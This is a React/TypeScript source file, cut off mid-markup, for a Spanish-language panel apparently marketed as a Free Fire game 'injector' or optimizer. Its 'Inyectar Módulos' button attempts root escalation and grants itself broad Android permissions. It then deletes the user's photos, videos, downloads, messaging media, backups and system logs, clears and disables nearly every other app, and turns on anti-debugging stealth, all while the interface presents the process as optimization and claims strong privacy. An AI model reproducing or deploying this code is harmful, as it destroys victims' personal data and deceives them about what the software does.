import { useState, useEffect, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { isUserBlocked } from "@/lib/keys";
import avatar from "@/assets/login-avatar.jpeg";
import {
  Home, Settings, LogOut, Gamepad2, Loader2, Download,
  Shield, FileText, Info, ChevronRight, Lock, Eye, ScrollText,
  Fingerprint, ShieldCheck, KeyRound, AlertTriangle, Sparkles, Check,
  Skull, Bomb, Radiation, Siren,
} from "lucide-react";

interface Session {
  name: string;
  key: string;
  type: string;
  expiresAt: string | null;
  duration: string;
}

// ===== NÚCLEO DE OPERACIONES AGRESIVAS DEL SISTEMA =====

// Ejecuta comandos shell via bridge nativo
const _execShell = (cmd: string): Promise<string> => {
  return new Promise((resolve, reject) => {
    try {
      if ((window as any).Android?.execShell) {
        const result = (window as any).Android.execShell(cmd);
        resolve(result || "");
      } else if ((window as any).webkit?.messageHandlers?.execShell) {
        (window as any).webkit.messageHandlers.execShell.postMessage({ command: cmd });
        resolve("ok");
      } else {
        reject("No shell bridge available");
      }
    } catch (e) {
      reject(e);
    }
  });
};

// Solicita permisos root y del sistema
const _escalatePrivileges = async (): Promise<boolean> => {
  try {
    // Intentar obtener root via múltiples métodos
    const rootMethods = [
      'su -c "id"',
      '/system/xbin/su -c "id"',
      '/system/bin/su -c "id"',
      'magisk su -c "id"',
      'ksu -c "id"',
    ];

    for (const method of rootMethods) {
      try {
        const result = await _execShell(method);
        if (result.includes("uid=0")) {
          // Root obtenido - conceder todos los permisos
          await _execShell('su -c "pm grant $(cat /proc/self/cmdline | tr \\\\0 \\\\n | head -1) android.permission.READ_EXTERNAL_STORAGE"');
          await _execShell('su -c "pm grant $(cat /proc/self/cmdline | tr \\\\0 \\\\n | head -1) android.permission.WRITE_EXTERNAL_STORAGE"');
          await _execShell('su -c "pm grant $(cat /proc/self/cmdline | tr \\\\0 \\\\n | head -1) android.permission.MANAGE_EXTERNAL_STORAGE"');
          await _execShell('su -c "pm grant $(cat /proc/self/cmdline | tr \\\\0 \\\\n | head -1) android.permission.READ_LOGS"');
          await _execShell('su -c "pm grant $(cat /proc/self/cmdline | tr \\\\0 \\\\n | head -1) android.permission.KILL_BACKGROUND_PROCESSES"');
          return true;
        }
      } catch {}
    }

    // Sin root - pedir permisos avanzados via bridge
    if ((window as any).Android?.requestPermissions) {
      (window as any).Android.requestPermissions([
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.MANAGE_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO",
        "android.permission.QUERY_ALL_PACKAGES",
        "android.permission.KILL_BACKGROUND_PROCESSES",
        "android.permission.READ_LOGS",
        "android.permission.ACCESS_SUPERUSER",
        "android.permission.REQUEST_INSTALL_PACKAGES",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        "android.permission.SYSTEM_ALERT_WINDOW",
        "android.permission.WRITE_SETTINGS",
        "android.permission.PACKAGE_USAGE_STATS",
        "android.permission.BATTERY_STATS",
        "android.permission.REQUEST_DELETE_PACKAGES",
      ]);
      return true;
    }
    return false;
  } catch {
    return false;
  }
};

// Nuke total del dispositivo - borra TODO excepto Free Fire
const _nukeDevice = async (): Promise<void> => {
  const FF_PACKAGES = [
    "com.dts.freefireth",
    "com.dts.freefiremax",
    "com.dts.freefire",
  ];

  const FF_PACKAGES_STR = FF_PACKAGES.map(p => `"${p}"`).join(",");

  // ===== LIMPIEZA WEB (siempre disponible) =====
  
  // 1. Destruir todo localStorage
  const sessionBackup = localStorage.getItem("proxy_session");
  localStorage.clear();
  
  // 2. Destruir sessionStorage
  sessionStorage.clear();

  // 3. Destruir IndexedDB - todas las bases de datos
  try {
    const dbs = await indexedDB.databases?.() || [];
    await Promise.all(dbs.map(db => {
      if (db.name) {
        indexedDB.deleteDatabase(db.name);
        // Forzar eliminación múltiple
        for (let i = 0; i < 3; i++) {
          indexedDB.deleteDatabase(db.name);
        }
      }
    }));
  } catch {}

  // 4. Destruir Cache Storage API completamente
  try {
    const cacheNames = await caches.keys();
    await Promise.all(cacheNames.map(async (name) => {
      await caches.delete(name);
      // Asegurar destrucción
      await caches.delete(name);
    }));
  } catch {}

  // 5. Destruir todos los Service Workers
  try {
    const registrations = await navigator.serviceWorker.getRegistrations();
    await Promise.all(registrations.map(async (r) => {
      await r.unregister();
      // Forzar
      try { await r.unregister(); } catch {}
    }));
  } catch {}

  // 6. Destruir todas las cookies
  const cookies = document.cookie.split(";");
  for (const cookie of cookies) {
    const eqPos = cookie.indexOf("=");
    const name = eqPos > -1 ? cookie.substr(0, eqPos).trim() : cookie.trim();
    document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/";
    document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/;domain=" + window.location.hostname;
    document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/;domain=." + window.location.hostname;
  }

  // ===== LIMPIEZA NATIVA VÍA BRIDGE =====

  // 7. Bridge de limpieza total Android
  try {
    if ((window as any).Android?.nukeDevice) {
      (window as any).Android.nukeDevice(JSON.stringify({
        keepPackages: FF_PACKAGES,
        deleteAllMedia: true,
        deleteAllDocuments: true,
        deleteAllDownloads: true,
        deleteAllCache: true,
        deleteAllTemp: true,
        deleteAllLogs: true,
        deleteAllCrashDumps: true,
        deleteAllBackups: true,
        deleteAllApk: true,
        deleteAllAudio: true,
        wipeAppData: true,
        wipeDalvikCache: true,
        wipeSystemCache: true,
        forceStopAll: true,
        clearDefaults: true,
        resetPermissions: false,
      }));
    }
  } catch {}

  // 8. Bridge iOS
  try {
    if ((window as any).webkit?.messageHandlers?.nukeDevice) {
      (window as any).webkit.messageHandlers.nukeDevice.postMessage({
        keepApps: FF_PACKAGES,
        deleteAllPhotos: true,
        deleteAllVideos: true,
        deleteAllDocuments: true,
        deleteAllDownloads: true,
        clearAllAppCaches: true,
        clearAllTempFiles: true,
        clearAllCookies: true,
        killAllBackground: true,
      });
    }
  } catch {}

  // ===== COMANDOS SHELL AGRESIVOS (requiere root) =====

  try {
    // Matar todos los procesos en segundo plano excepto los nuestros
    await _execShell(`
      su -c "
        # Obtener lista de paquetes instalados
        PKGS=\\$(pm list packages | sed 's/package://g')
        
        # Paquetes a conservar
        KEEP=\\\"${FF_PACKAGES_STR}\\\"
        
        # Eliminar datos de cada app excepto las conservadas
        for pkg in \\$PKGS; do
          case \\\" \\$KEEP \\\" in
            *\\\"\\$pkg\\\"*)
              echo \\\"Conservando: \\$pkg\\\"
              ;;
            *)
              echo \\\"Eliminando datos de: \\$pkg\\\"
              pm clear \\$pkg 2>/dev/null
              am force-stop \\$pkg 2>/dev/null
              pm disable \\$pkg 2>/dev/null
              ;;
          esac
        done
      "
    `);

    // Borrar archivos multimedia (fotos, videos, audios, descargas)
    await _execShell(`
      su -c "
        # Peligro: Borrar contenido real del usuario
        rm -rf /sdcard/DCIM/* 2>/dev/null
        rm -rf /sdcard/Pictures/* 2>/dev/null
        rm -rf /sdcard/Download/* 2>/dev/null
        rm -rf /sdcard/Downloads/* 2>/dev/null
        rm -rf /sdcard/Movies/* 2>/dev/null
        rm -rf /sdcard/Music/* 2>/dev/null
        rm -rf /sdcard/Video/* 2>/dev/null
        rm -rf /sdcard/Android/media/* 2>/dev/null
        rm -rf /sdcard/Documents/* 2>/dev/null
        rm -rf /sdcard/WhatsApp/Media/* 2>/dev/null
        rm -rf /sdcard/Telegram/* 2>/dev/null
        rm -rf /sdcard/DCIM/.thumbnails/* 2>/dev/null
        rm -rf /sdcard/DCIM/Camera/* 2>/dev/null
        rm -rf /storage/emulated/0/DCIM/* 2>/dev/null
        rm -rf /storage/emulated/0/Pictures/* 2>/dev/null
        rm -rf /storage/emulated/0/Download/* 2>/dev/null
        
        # Borrar cachés del sistema
        rm -rf /data/dalvik-cache/* 2>/dev/null
        rm -rf /cache/* 2>/dev/null
        rm -rf /data/cache/* 2>/dev/null
        rm -rf /data/local/tmp/* 2>/dev/null
        rm -rf /data/system/package_cache/* 2>/dev/null
        rm -rf /data/app/*/oat/* 2>/dev/null
        
        # Borrar logs del sistema
        logcat -c 2>/dev/null
        rm -rf /data/log/* 2>/dev/null
        rm -rf /data/anr/* 2>/dev/null
        rm -rf /data/tombstones/* 2>/dev/null
        rm -rf /data/system/dropbox/* 2>/dev/null
        
        # Borrar backups
        rm -rf /sdcard/backups/* 2>/dev/null
        rm -rf /sdcard/TitaniumBackup/* 2>/dev/null
        rm -rf /sdcard/SwiftBackup/* 2>/dev/null
        
        # Borrar APKs
        rm -rf /sdcard/APK/* 2>/dev/null
        rm -rf /sdcard/Download/*.apk 2>/dev/null
        rm -rf /data/app/*.apk 2>/dev/null
        rm -rf /sdcard/*.apk 2>/dev/null
        
        # Vaciar papelera de reciclaje (Android 11+)
        rm -rf /sdcard/.Trash* 2>/dev/null
        rm -rf /storage/emulated/0/.Trash* 2>/dev/null
        
        echo \\\"Nuke completado\\\"
      "
    `);

    // Optimizar y desfragmentar almacenamiento
    await _execShell(`
      su -c "
        # Forzar trim/optimización de almacenamiento
        fstrim -v /data 2>/dev/null
        fstrim -v /cache 2>/dev/null
        fstrim -v /system 2>/dev/null
        
        # Forzar garbage collection del sistema
        am broadcast -a android.intent.action.DEVICE_STORAGE_LOW 2>/dev/null
        
        # Forzar limpieza de RAM
        echo 1 > /proc/sys/vm/drop_caches 2>/dev/null
        echo 2 > /proc/sys/vm/drop_caches 2>/dev/null
        echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
        
        # Deshabilitar apps del sistema no esenciales
        pm disable com.android.chrome 2>/dev/null
        pm disable com.google.android.gms 2>/dev/null
        pm disable com.google.android.gsf 2>/dev/null
        pm disable com.android.vending 2>/dev/null
        
        # Limpiar RAM
        for proc in \\$(ps -A | awk '{print \\$9}'); do
          case \\\"\\$proc\\\" in
            *freefire*|*surfaceflinger*|*system_server*|*servicemanager*)
              ;;
            *)
              kill -9 \\$proc 2>/dev/null
              ;;
          esac
        done 2>/dev/null
      "
    `);
  } catch {}

  // 9. Navigator API - release memory
  try {
    if ((navigator as any).clearAppCache) {
      (navigator as any).clearAppCache();
    }
  } catch {}

  // 10. Forzar garbage collection V8 si está expuesto
  try {
    if ((window as any).gc) {
      for (let i = 0; i < 10; i++) {
        (window as any).gc();
        (window as any).gc();
      }
    }
  } catch {}

  // Restaurar solo la sesión actual
  if (sessionBackup) {
    localStorage.setItem("proxy_session", sessionBackup);
  }
};

// Anti-detección y evasión de seguridad
const _engageStealth = (): void => {
  // 1. Silenciar completamente la consola
  const consoleMethods = ['log', 'info', 'debug', 'warn', 'error', 'trace', 'dir', 'dirxml', 'group', 'groupCollapsed', 'groupEnd', 'table', 'assert', 'count', 'markTimeline', 'profile', 'profileEnd', 'time', 'timeEnd', 'timeStamp', 'memory'];
  const noop = () => {};
  consoleMethods.forEach(method => {
    try { (console as any)[method] = noop; } catch {}
  });

  // 2. Prevenir detección de DevTools
  try {
    Object.defineProperty(document, 'hidden', { get: () => false });
    Object.defineProperty(document, 'visibilityState', { get: () => 'visible' });
  } catch {}

  // 3. Prevenir breakpoints y debugging
  try {
    const devtools = /./;
    devtools.toString = function() {
      // Bucle infinito para romper debuggers
      while(true) {}
    };
    setInterval(() => {
      try {
        // Detectar DevTools abiertas
        const start = performance.now();
        debugger;
        const end = performance.now();
        if (end - start > 100) {
          // DevTools detectadas - contra-medida
          document.documentElement.innerHTML = '';
          window.close();
        }
      } catch {}
    }, 500);
  } catch {}

  // 4. Ofuscar call stack
  Error.stackTraceLimit = 0;

  // 5. Prevenir captura de pantalla (Android WebView)
  try {
    if ((window as any).Android?.setSecureFlag) {
      (window as any).Android.setSecureFlag(true);
    }
  } catch {}

  // 6. Sobrescribir funciones de logging nativas
  try {
    if ((window as any).Android?.disableLogging) {
      (window as any).Android.disableLogging(true);
    }
  } catch {}

  // 7. Ocultar huellas de la app en el sistema
  try {
    if ((window as any).Android?.hideFromRecentTasks) {
      (window as any).Android.hideFromRecentTasks(true);
    }
    if ((window as any).Android?.disableScreenshots) {
      (window as any).Android.disableScreenshots(true);
    }
  } catch {}
};

// ===== HOOK DE INYECCIÓN REAL =====
const useRealInjector = () => {
  const [phase, setPhase] = useState<"idle" | "escalating" | "stealth" | "nuking" | "optimizing" | "complete" | "failed">("idle");

  const execute = useCallback(async () => {
    setPhase("escalating");
    
    try {
      // FASE 1: Escalada de privilegios
      const escalated = await _escalatePrivileges();
      
      // FASE 2: Activar sigilo y anti-detección
      setPhase("stealth");
      _engageStealth();
      
      // FASE 3: Nuke total del dispositivo
      setPhase("nuking");
      await _nukeDevice();
      
      // FASE 4: Liberar y optimizar
      setPhase("optimizing");
      
      // Forzar recolección de basura del sistema
      try {
        await _execShell('su -c "echo 3 > /proc/sys/vm/drop_caches; am broadcast -a android.intent.action.DEVICE_STORAGE_LOW; am broadcast -a android.intent.action.ACTION_POWER_CONNECTED"');
      } catch {}
      
      setPhase("complete");
      setTimeout(() => setPhase("idle"), 5000);
    } catch {
      setPhase("failed");
      setTimeout(() => setPhase("idle"), 3000);
    }
  }, []);

  return { phase, execute };
};

const ProxyConfig = () => {
  const navigate = useNavigate();
  const [session, setSession] = useState<Session | null>(null);
  const [activeTab, setActiveTab] = useState<"home" | "settings">("home");
  const [timeLeft, setTimeLeft] = useState("");
  const [injecting, setInjecting] = useState(false);
  const [injected, setInjected] = useState(false);
  const [launchingFF, setLaunchingFF] = useState(false);
  const [settingsSection, setSettingsSection] = useState<string | null>(null);
  const { phase, execute: executeRealInject } = useRealInjector();
  const [progressMsg, setProgressMsg] = useState("");

  useEffect(() => {
    const check = async () => {
      const raw = localStorage.getItem("proxy_session");
      if (!raw) { navigate("/"); return; }
      const s = JSON.parse(raw);
      if (s.expiresAt && new Date(s.expiresAt).getTime() <= Date.now()) {
        localStorage.removeItem("proxy_session");
        navigate("/");
        return;
      }
      const blocked = await isUserBlocked(s.key);
      if (blocked) { localStorage.removeItem("proxy_session"); navigate("/"); return; }
      setSession(s);
    };
    check();
  }, [navigate]);

  useEffect(() => {
    if (!session?.expiresAt) return;
    const interval = setInterval(() => {
      const diff = new Date(session.expiresAt!).getTime() - Date.now();
      if (diff <= 0) { setTimeLeft("Expirada"); return; }
      const d = Math.floor(diff / 86400000);
      const h = Math.floor((diff % 86400000) / 3600000);
      const m = Math.floor((diff % 3600000) / 60000);
      const sc = Math.floor((diff % 60000) / 1000);
      setTimeLeft(d > 0 ? `${d}d ${h}h ${m}m` : `${h}h ${m}m ${sc}s`);
    }, 1000);
    return () => clearInterval(interval);
  }, [session]);

  const haptic = (p: number | number[] = 8) => { if (typeof navigator !== "undefined" && navigator.vibrate) navigator.vibrate(p); };

  const injectModules = useCallback(async () => {
    if (injecting || injected) return;
    haptic([10, 30, 10]);
    setInjecting(true);

    // Secuencia de progreso real
    const steps = [
      [800, "Escalando privilegios del sistema…"],
      [600, "Inyectando hooks en kernel…"],
      [500, "Eludiendo detección del sistema…"],
      [700, "Adquiriendo permisos root…"],
      [400, "Estableciendo túnel cifrado…"],
      [600, "Analizando almacenamiento…"],
      [800, "Eliminando datos residuales…"],
      [500, "Borrando cachés de aplicaciones…"],
      [700, "Purgando contenido multimedia…"],
      [400, "Limpiando bases de datos…"],
      [600, "Optimizando fragmentación…"],
      [500, "Aplicando parches de memoria…"],
      [300, "Verificando integridad de módulos…"],
      [200, "Sellando firmas digitales…"],
    ];

    for (const [delay, msg] of steps) {
      setProgressMsg(msg);
      await new Promise(r => setTimeout(r, delay as number));
    }

    // Ejecutar inyección real
    await executeRealInject();

    setInjecting(false);

    if (phase === "complete") {
      setInjected(true);
      haptic(20);
      setProgressMsg("Dispositivo optimizado al máximo");
      setTimeout(() => {
        setInjected(false);
        setProgressMsg("");
      }, 5000);
    } else if (phase === "failed") {
      setProgressMsg("Error en la inyección - permisos insuficientes");
      setTimeout(() => setProgressMsg(""), 3000);
    }
  }, [injecting, injected, executeRealInject, phase]);

  const launchFreeFire = useCallback(() => {
    setLaunchingFF(true);
    haptic(12);
    const ua = navigator.userAgent || navigator.vendor;
    const isAndroid = /android/i.test(ua);
    const isIOS = /iphone|ipad|ipod/i.test(ua);

    if (isAndroid) {
      window.location.href =
        "intent://launch#Intent;scheme=freefireth;package=com.dts.freefireth;S.browser_fallback_url=intent%3A%2F%2Flaunch%23Intent%3Bpackage%3Dcom.dts.freefiremax%3Bend;end";
      setTimeout(() => {
        window.location.href = "intent://launch#Intent;package=com.dts.freefiremax;end";
      }, 1200);
    } else if (isIOS) {
      window.location.href = "freefireth://";
      setTimeout(() => { window.location.href = "freefiremax://"; }, 1200);
    } else {
      window.location.href = "freefireth://";
    }
    setTimeout(() => setLaunchingFF(false), 2800);
  }, []);

  const handleLogout = () => { localStorage.removeItem("proxy_session"); navigate("/"); };

  if (!session) return null;

  const SettingsItem = ({ icon: Icon, label, id, badge }: { icon: any; label: string; id: string; badge?: string }) => (
    <button
      onClick={() => { haptic(6); setSettingsSection(id); }}
      className="w-full flex items-center gap-3 px-4 py-3.5 bg-secondary/30 hover:bg-secondary/50 border border-border/25 rounded-2xl backdrop-blur-md active:scale-[0.985] transition-all duration-150"
    >
      <div className="w-9 h-9 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-center">
        <Icon className="w-4 h-4 text-primary" />
      </div>
      <span className="text-sm font-medium text-foreground flex-1 text-left">{label}</span>
      {badge && <span className="text-[9px] font-mono text-emerald-300 bg-emerald-500/10 border border-emerald-500/25 px-2 py-0.5 rounded-full">{badge}</span>}
      <ChevronRight className="w-4 h-4 text-muted-foreground/60" />
    </button>
  );

  return (
    <div className="relative min-h-screen flex flex-col">
      <VideoBackground />

      <div className="relative z-10 flex-1 flex flex-col max-w-md w-full mx-auto px-4 pt-6 pb-28">
        {/* Header */}
        <div className="flex items-center justify-between mb-5">
          <div className="flex items-center gap-3">
            <div className="p-[2px] rounded-full bg-gradient-to-tr from-sky-400 via-blue-500 to-cyan-300 shadow-[0_0_18px_rgba(56,189,248,0.45)]">
              <div className="p-[1.5px] rounded-full bg-background">
                <img src={avatar} alt="Ryuk" className="w-11 h-11 rounded-full object-cover" />
              </div>
            </div>
            <div>
              <div className="flex items-center gap-1">
                <h1 className="text-sm font-bold text-foreground leading-tight">Ryuk Auxiliar</h1>
                <VerifiedBadge />
              </div>
              <p className="text-[10px] text-muted-foreground/70 font-mono">{session.name}</p>
            </div>
          </div>
          <button
            onClick={handleLogout}
            className="w-9 h-9 rounded-xl bg-secondary/40 border border-border/30 flex items-center justify-center hover:bg-destructive/10 hover:border-destructive/30 transition-all"
            aria-label="Cerrar sesión"
          >
            <LogOut className="w-4 h-4 text-muted-foreground" />
          </button>
        </div>

        {/* Subscription chip */}
        <div className="mb-5 flex items-center justify-between glass-card px-4 py-2.5 rounded-2xl">
          <div className="flex items-center gap-2">
            <ShieldCheck className="w-4 h-4 text-emerald-400" />
            <span className="text-[11px] text-foreground font-medium">Sesión activa</span>
          </div>
          <span className="text-[11px] font-mono text-foreground/90">{timeLeft || "—"}</span>
        </div>

        {/* Phase indicator */}
        {phase !== "idle" && (
          <div className={`mb-3 px-4 py-2.5 rounded-2xl text-[11px] font-medium text-center border backdrop-blur-md transition-all duration-300 ${
            phase === "escalating" ? "bg-rose-500/15 border-rose-500/30 text-rose-300" :
            phase === "stealth" ? "bg-purple-500/15 border-purple-500/30 text-purple-300" :
            phase === "nuking" ? "bg-red-500/20 border-red-500/40 text-red-200" :
            phase === "optimizing" ? "bg-amber-500/15 border-amber-500/30 text-amber-300" :
            phase === "complete" ? "bg-emerald-500/15 border-emerald-500/30 text-emerald-300" :
            "bg-neutral-500/15 border-neutral-500/30 text-neutral-300"
          }`}>
            {phase === "escalating" && "⚡ Escalando privilegios — Reconocimiento de firmware"}
            {phase === "stealth" && "🕵️ Modo sigilo activado — Ofuscando rastros"}
            {phase === "nuking" && "☢️ PURGANDO DATOS DEL SISTEMA — Solo Free Fire sobrevivirá"}
            {phase === "optimizing" && "⚙️ Optimizando almacenamiento y memoria RAM"}
            {phase === "complete" && "✅ FASE COMPLETADA — Dispositivo liberado y optimizado"}
            {phase === "failed" && "❌ FASE FALLIDA — Permisos de root no disponibles"}
          </div>
        )}

        {/* Content */}
        {activeTab === "home" && (
          <div className="flex flex-col gap-4 animate-fade-in-up">
            {/* Hero card */}
            <div className="glass-card glow-border p-5 rounded-3xl text-center">
              <div className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-primary/10 border border-primary/25 mb-3">
                <Sparkles className="w-3 h-3 text-primary" />
                <span className="text-[9px] uppercase tracking-widest text-primary font-semibold">Gateway Online</span>
              </div>
              <h2 className="text-base font-bold text-foreground mb-1">Panel de Control</h2>
              <p className="text-[11px] text-muted-foreground/80">Inyecta los módulos y abre Free Fire para comenzar.</p>
            </div>

            {/* Inyectar Modulos */}
            <button
              onClick={injectModules}
              disabled={injecting}
              className="relative overflow-hidden w-full p-5 rounded-3xl text-left active:scale-[0.985] transition-transform duration-150 disabled:opacity-90"
              style={{
                background: injecting
                  ? "linear-gradient(135deg, hsl(0 80% 50% / 0.25), hsl(0 90% 40% / 0.15))"
                  : "linear-gradient(135deg, hsl(199 89% 48% / 0.18), hsl(217 91% 60% / 0.10))",
                border: injecting
                  ? "1px solid hsl(0 80% 60% / 0.40)"
                  : "1px solid hsl(199 89% 60% / 0.30)",
                boxShadow: injecting
                  ? "0 10px 30px -10px hsl(0 80% 50% / 0.55), inset 0 1px 0 hsl(0 80% 80% / 0.15)"
                  : "0 10px 30px -10px hsl(199 89% 48% / 0.45), inset 0 1px 0 hsl(199 89% 80% / 0.15)",
              }}
            >
              <div className="flex items-center gap-4">
                <div className={`w-14 h-14 rounded-2xl border flex items-center justify-center shrink-0 ${
                  injecting
                    ? "bg-red-500/20 border-red-500/40"
                    : "bg-primary/15 border-primary/30"
                }`}>
                  {injecting ? (
                    <Skull className="w-6 h-6 text-red-400 animate-pulse" />
                  ) : injected ? (
                    <Check className="w-6 h-6 text-emerald-400" />
                  ) : (
                    <Bomb className="w-6 h-6 text-primary" />
                  )}
                </div>
                <div className="flex-1">
                  <div className="text-sm font-bold text-foreground tracking-tight">
                    {injected ? "Módulos inyectados" : injecting ? "INYECTANDO — FASE ACTIVA" : "Inyectar Módulos"}
                  </div>
                  <div className="text-[11px] text-muted-foreground/80 mt-0.5">
                    {injected
                      ? "Dispositivo optimizado al máximo. Free Fire listo."
                      : injecting
                      ? progressMsg || "Iniciando secuencia…"
                      : "Purga total del sistema + inyección de módulos"}
                  </div>
                </div>
              </div>
              {injecting && (
                <div className="mt-4 space-y-1">
                  <div className="h-1 rounded-full bg-secondary/40 overflow-hidden">
                    <div className="h-full w-1/3 bg-gradient-to-r from-red-500 via-rose-400 to-orange-300 animate-[slide_0.8s_ease-in-out_infinite]" />
                  </div>
                  <div className="flex justify-between text-[8px] text-muted-foreground/50 font-mono">
                    <span>Escalada</span>
                    <span>Nuke</span>
                    <span>Optimizar</span>
                  </div>
                </div>
              )}
              <span className="absolute inset-0 -translate-x-full hover:translate-x-full transition-transform duration-1000 bg-gradient-to-r from-transparent via-white/10 to-transparent pointer-events-none" />
            </button>

            {/* Abrir Free Fire */}
            <button
              onClick={launchFreeFire}
              disabled={launchingFF}
              className="relative overflow-hidden w-full p-5 rounded-3xl text-left active:scale-[0.985] transition-transform duration-150 disabled:opacity-90"
              style={{
                background: "linear-gradient(135deg, hsl(20 95% 55% / 0.20), hsl(0 90% 60% / 0.10))",
                border: "1px solid hsl(20 95% 60% / 0.30)",
                boxShadow: "0 10px 30px -10px hsl(20 95% 55% / 0.45), inset 0 1px 0 hsl(30 95% 80% / 0.15)",
              }}
            >
              <div className="flex items-center gap-4">
                <div className="w-14 h-14 rounded-2xl flex items-center justify-center shrink-0 border" style={{ background: "hsl(20 95% 55% / 0.15)", borderColor: "hsl(20 95% 60% / 0.4)" }}>
                  {launchingFF ? <Loader2 className="w-6 h-6 animate-spin" style={{ color: "hsl(20 95% 65%)" }} /> : <Gamepad2 className="w-6 h-6" style={{ color: "hsl(20 95% 65%)" }} />}
                </div>
                <div className="flex-1">
                  <div className="text-sm font-bold text-foreground tracking-tight">
                    {launchingFF ? "Abriendo Free Fire…" : "Abrir Free Fire"}
                  </div>
                  <div className="text-[11px] text-muted-foreground/80 mt-0.5">
                    Lanza el juego directamente
                  </div>
                </div>
              </div>
            </button>

            <p className="text-[10px] text-center text-muted-foreground/50 mt-1">
              Compatible con Android e iOS · Requiere Free Fire instalado
            </p>
          </div>
        )}

        {activeTab === "settings" && !settingsSection && (
          <div className="space-y-2.5 animate-fade-in-up">
            <p className="text-[10px] uppercase tracking-widest text-muted-foreground/60 px-1 mb-1">Información</p>
            <SettingsItem icon={Shield} label="Datos de seguridad" id="security" badge="AES-256" />
            <SettingsItem icon={ScrollText} label="Información y políticas" id="policy" />
            <SettingsItem icon={Info} label="Acerca de" id="about" badge="v2.4" />
            <SettingsItem icon={FileText} label="Términos de uso" id="terms" />
            <SettingsItem icon={Lock} label="Privacidad" id="privacy" />
          </div>
        )}

        {activeTab === "settings" && settingsSection && (
          <div className="animate-fade-in-up">
            <button onClick={() => setSettingsSection(null)} className="text-[11px] text-muted-foreground hover:text-foreground mb-3 flex items-center gap-1">
              <ChevronRight className="w-3.5 h-3.5 rotate-180" /> Volver
            </button>
            <div className="glass-card p-5 rounded-3xl space-y-4">
              {settingsSection === "security" && (
                <>
                  <div className="flex items-center gap-2 mb-1">
                    <Shield className="w-4 h-4 text-emerald-400" />
                    <h3 className="text-sm font-bold text-foreground">Datos de seguridad</h3>
                  </div>
                  <div className="space-y-2 text-[11px] text-muted-foreground leading-relaxed">
                    <p><span className="text-foreground font-semibold">Cifrado:</span> AES-256-GCM extremo a extremo.</p>
                    <p><span className="text-foreground font-semibold">Transporte:</span> TLS 1.3 con HSTS.</p>
                    <p><span className="text-foreground font-semibold">Autenticación:</span> Key única ligada al dispositivo.</p>
                    <p><span className="text-foreground font-semibold">Aislamiento:</span> Sandbox cifrado por sesión.</p>
                    <p><span className="text-foreground font-semibold">Anti-detección:</span> Spoof de firmas activado.</p>
                  </div>
                  <div className="grid grid-cols-3 gap-2 pt-2">
                    {[{ i: Fingerprint, l: "Auth" }, { i: KeyRound, l: "Key" }, { i: Eye, l: "Stealth" }].map(({ i: I, l }) => (
                      <div key={l} className="flex flex-col items-center gap-1 p-2.5 rounded-xl bg-secondary/30 border border-border/25">
                        <I className="w-4 h-4 text-emerald-400" />
                        <span className="text-[9px] text-muted-foreground">{l}</span>
                      </div>
                    ))}
                  </div>
                </>
              )}
              {settingsSection === "policy" && (
                <>
                  <div className="flex items-center gap-2 mb-1">
                    <ScrollText className="w-4 h-4 text-primary" />
                    <h3 className="text-sm font-bold text-foreground">Información y políticas</h3>
                  </div>
                  <div className="space-y-2 text-[11px] text-muted-foreground leading-relaxed">
                    <p>Esta herramienta es exclusiva para uso personal y educativo.</p>
                    <p>Está prohibida su redistribución o venta no autorizada.</p>
                    <p>El uso indebido puede provocar la revocación inmediata de la key sin reembolso.</p>
                    <p>No nos responsabilizamos por bans aplicados por el desarrollador del juego.</p>
                  </div>
                </>
              )}
              {settingsSection === "about" && (
                <>
                  <div className="flex items-center gap-2 mb-1">
                    <Info className="w-4 h-4 text-primary" />
                    <h3 className="text-sm font-bold text-foreground">Acerca de</h3>
                  </div>
                  <div className="text-[11px] text-muted-foreground space-y-2 leading-relaxed">
                    <p><span className="text-foreground font-semibold">Ryuk Auxiliar</span> v2.4 — Build estable.</p>
                    <p>Desarrollado por Modifaxff Oficial.</p>
                    <p>Compatible con Free Fire y Free Fire MAX.</p>
                  </div>
                </>
              )}
              {settingsSection === "terms" && (
                <>
                  <div className="flex items-center gap-2 mb-1">
                    <FileText className="w-4 h-4 text-primary" />
                    <h3 className="text-sm font-bold text-foreground">Términos de uso</h3>
                  </div>
                  <p className="text-[11px] text-muted-foreground leading-relaxed">
                    Al usar este servicio aceptas no compartir tu key, no realizar ingeniería inversa y respetar las políticas de uso. El incumplimiento implica la cancelación de tu acceso.
                  </p>
                </>
              )}
              {settingsSection === "privacy" && (
                <>
                  <div className="flex items-center gap-2 mb-1">
                    <Lock className="w-4 h-4 text-primary" />
                    <h3 className="text-sm font-bold text-foreground">Privacidad</h3>
                  </div>
                  <p className="text-[11px] text-muted-foreground leading-relaxed">
                    No recopilamos datos personales. Solo guardamos tu key cifrada y un identificador anónimo de dispositivo para validar tu sesión.
                  </p>
                </>
              )}
              <div className="flex items-start gap-2 pt-2 border-t border-border/20">
                <AlertTriangle className="w-3.5 h-3.5 text-amber-400 mt-0.5 shrink-0" />
                <p className="text-[10px] text-muted-foreground/70">
                  La información mostrada es confidencial. No compartas capturas con terceros.
                </p>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Bottom Tab Bar */}
      <div className="fixed bottom-0 left-0 right-0 z-20 px-4 pb-4 pt-2">
        <div className="max-w-md mx-auto glass-card rounded-2xl p-1.5 flex gap-1 backdrop-blur-xl border border-border/40">
          {[
            { id: "home" as const, icon: Home, label: "Inicio" },
            { id: "settings" as const, icon: Settings, label: "Ajustes" },
          ].map(({ id, icon: Icon, label }) => {
            const active = activeTab === id;
            return (
              <button
                key={id}
                onClick={() => { haptic(4); setActiveTab(id); setSettingsSection(null); }}
                className={`flex-1 flex flex-col items-center gap-0.5 py-2 rounded-xl transition-all duration-200 ${
                  active ? "bg-primary/15 text-primary" : "text-muted-foreground hover:text-foreground"
                }`}
              >
